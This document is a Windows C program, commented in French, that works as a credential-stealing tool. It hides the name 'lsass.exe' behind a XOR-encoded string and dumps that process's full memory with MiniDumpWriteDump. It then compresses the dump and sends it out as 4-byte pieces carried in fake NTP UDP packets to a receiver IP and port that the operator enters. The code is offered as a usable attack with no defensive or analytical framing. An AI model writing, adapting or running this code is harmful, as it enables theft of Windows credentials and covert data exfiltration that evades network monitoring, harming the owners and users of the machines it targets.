#include <windows.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <zlib.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "DbgHelp.lib")

// --- Fonction de déobfuscation ---
// Décodage d'une chaîne obfusquée (chaque caractère XOR avec la clé)
void DecodeString(const wchar_t *encoded, int key, wchar_t *decoded, size_t maxLen) {
    size_t i = 0;
    while (encoded[i] != L'\0' && i < maxLen - 1) {
        decoded[i] = encoded[i] ^ key;
        i++;
    }
    decoded[i] = L'\0';
}

// --- Fonction pour récupérer le PID d'un processus ---
// Utilise CreateToolhelp32Snapshot et parcourt les processus
DWORD GetTargetProcessPID(const wchar_t *targetProcessName) {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, targetProcessName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return pid;
}

// --- Fonction de dump mémoire ---
// Effectue un dump mémoire du processus cible en utilisant MiniDumpWriteDump et un mapping mémoire temporaire
BOOL DumpProcessToMemory(DWORD pid, char **dumpBuffer, size_t *dumpSize) {
    HMODULE hDbgHelp = LoadLibrary(L"DbgHelp.dll");
    if (!hDbgHelp)
        return FALSE;

    typedef BOOL (WINAPI *MiniDumpWriteDumpType)(HANDLE, DWORD, HANDLE, MINIDUMP_TYPE,
        PMINIDUMP_EXCEPTION_INFORMATION, PMINIDUMP_USER_STREAM_INFORMATION, PMINIDUMP_CALLBACK_INFORMATION);
    MiniDumpWriteDumpType MiniDumpWriteDumpFunc = (MiniDumpWriteDumpType)GetProcAddress(hDbgHelp, "MiniDumpWriteDump");
    if (!MiniDumpWriteDumpFunc) {
        FreeLibrary(hDbgHelp);
        return FALSE;
    }

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProcess) {
        FreeLibrary(hDbgHelp);
        return FALSE;
    }

    size_t bufferSize = 0x1000000; // 16 MB
    HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, (DWORD)bufferSize, NULL);
    if (!hMapping) {
        CloseHandle(hProcess);
        FreeLibrary(hDbgHelp);
        return FALSE;
    }
    void* buffer = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, bufferSize);
    if (!buffer) {
        CloseHandle(hMapping);
        CloseHandle(hProcess);
        FreeLibrary(hDbgHelp);
        return FALSE;
    }
    BOOL success = MiniDumpWriteDumpFunc(hProcess, pid, hMapping, MiniDumpWithFullMemory, NULL, NULL, NULL);
    if (success) {
        *dumpBuffer = (char*)malloc(bufferSize);
        if (*dumpBuffer) {
            memcpy(*dumpBuffer, buffer, bufferSize);
            *dumpSize = bufferSize;
        } else {
            success = FALSE;
        }
    }
    UnmapViewOfFile(buffer);
    CloseHandle(hMapping);
    CloseHandle(hProcess);
    FreeLibrary(hDbgHelp);
    return success;
}

// --- Fonction de compression ---
// Compresse le buffer à l'aide de zlib
int CompressBuffer(const char *inputBuffer, size_t inputSize, char **compressedBuffer, size_t *compressedSize) {
    uLong bound = compressBound(inputSize);
    *compressedBuffer = (char*)malloc(bound);
    if (!*compressedBuffer)
        return Z_MEM_ERROR;
    int res = compress((Bytef*)*compressedBuffer, &bound, (const Bytef*)inputBuffer, inputSize);
    if (res == Z_OK) {
        *compressedSize = bound;
    } else {
        free(*compressedBuffer);
    }
    return res;
}

// --- Fonctions pour la création et l'envoi de faux paquets NTP ---
// Crée un paquet NTP de 48 octets avec le payload placé à l'offset 40
void CreateNTPPacket(const unsigned char payload[8], unsigned char packet[48]) {
    memset(packet, 0, 48);
    packet[0] = 0x1B; // LI=0, VN=3, Mode=3
    memcpy(packet + 40, payload, 8);
}

// Envoie un paquet UDP contenant le faux paquet NTP
int SendNTPPacket(const char *target_ip, int target_port, const unsigned char payload[8]) {
    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    int result = 0;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return -1;
    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return -1;
    }
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(target_port);
    addr.sin_addr.s_addr = inet_addr(target_ip);

    unsigned char packet[48];
    CreateNTPPacket(payload, packet);
    result = sendto(sock, (const char*)packet, 48, 0, (struct sockaddr*)&addr, sizeof(addr));
    closesocket(sock);
    WSACleanup();
    return result;
}

// --- Envoi du dump compressé sous forme de paquets NTP fragmentés ---
// Le premier paquet est un header de 8 octets (4 octets : nombre total de paquets, 4 octets : taille totale)
// Chaque paquet de données contient 8 octets : 4 octets de numéro de séquence et 4 octets de fragment de données.
int SendCompressedDumpAsNTP(const char *target_ip, int target_port, const char *compressedData, size_t compressedSize) {
    const int fragment_size = 4;
    int total_fragments = (int)((compressedSize + fragment_size - 1) / fragment_size);

    // Prépare le paquet header
    unsigned char header[8];
    header[0] = (total_fragments >> 24) & 0xFF;
    header[1] = (total_fragments >> 16) & 0xFF;
    header[2] = (total_fragments >> 8) & 0xFF;
    header[3] = total_fragments & 0xFF;
    header[4] = ((unsigned int)compressedSize >> 24) & 0xFF;
    header[5] = ((unsigned int)compressedSize >> 16) & 0xFF;
    header[6] = ((unsigned int)compressedSize >> 8) & 0xFF;
    header[7] = ((unsigned int)compressedSize) & 0xFF;

    if (SendNTPPacket(target_ip, target_port, header) == SOCKET_ERROR) {
        printf("[!] Failed to send header packet.\n");
        return -1;
    }
    printf("[+] Header sent: %d fragments, %zu bytes total.\n", total_fragments, compressedSize);

    // Envoi des paquets de données
    for (int seq = 0; seq < total_fragments; seq++) {
        unsigned char payload[8];
        payload[0] = (seq >> 24) & 0xFF;
        payload[1] = (seq >> 16) & 0xFF;
        payload[2] = (seq >> 8) & 0xFF;
        payload[3] = seq & 0xFF;
        int offset = seq * fragment_size;
        int remaining = (int)compressedSize - offset;
        int copySize = remaining < fragment_size ? remaining : fragment_size;
        memset(payload + 4, 0, 4);
        if (copySize > 0)
            memcpy(payload + 4, compressedData + offset, copySize);
        if (SendNTPPacket(target_ip, target_port, payload) == SOCKET_ERROR) {
            printf("[!] Failed to send packet %d.\n", seq + 1);
            return -1;
        }
        printf("[+] Packet %d/%d sent.\n", seq + 1, total_fragments);
    }
    printf("[+] Transmission completed.\n");
    return 0;
}

int main(void) {
    // Obfuscation de "lsass.exe" (chaque caractère XOR avec 0x13)
    wchar_t encodedTarget[] = { 'l' ^ 0x13, 's' ^ 0x13, 'a' ^ 0x13, 's' ^ 0x13,
                                  's' ^ 0x13, '.' ^ 0x13, 'e' ^ 0x13, 'x' ^ 0x13,
                                  'e' ^ 0x13, L'\0' };
    wchar_t targetProcessName[256];
    DecodeString(encodedTarget, 0x13, targetProcessName, 256);
    wprintf(L"[*] Decoded target process: %s\n", targetProcessName);

    char target_ip[64];
    int target_port;
    printf("[*] Enter receiver IP: ");
    if (scanf("%63s", target_ip) != 1) {
        printf("[!] Failed to read IP.\n");
        return 1;
    }
    printf("[*] Enter receiver port: ");
    if (scanf("%d", &target_port) != 1) {
        printf("[!] Failed to read port.\n");
        return 1;
    }

    DWORD pid = GetTargetProcessPID(targetProcessName);
    if (pid == 0) {
        printf("[!] Process not found.\n");
        return 1;
    }
    wprintf(L"[+] Process %s found with PID %lu\n", targetProcessName, pid);

    char *dumpBuffer = NULL;
    size_t dumpSize = 0;
    if (!DumpProcessToMemory(pid, &dumpBuffer, &dumpSize)) {
        printf("[!] Failed to dump process memory.\n");
        return 1;
    }
    printf("[+] Memory dump completed. Size: %zu bytes.\n", dumpSize);

    char *compressedBuffer = NULL;
    size_t compressedSize = 0;
    int compRes = CompressBuffer(dumpBuffer, dumpSize, &compressedBuffer, &compressedSize);
    free(dumpBuffer);
    if (compRes != Z_OK) {
        printf("[!] Failed to compress dump. Error: %d\n", compRes);
        return 1;
    }
    printf("[+] Compression completed. Compressed size: %zu bytes.\n", compressedSize);

    if (SendCompressedDumpAsNTP(target_ip, target_port, compressedBuffer, compressedSize) != 0) {
        printf("[!] Failed to send compressed dump to receiver.\n");
        free(compressedBuffer);
        return 1;
    }
    free(compressedBuffer);
    printf("[+] Done!\n");
    return 0;
}
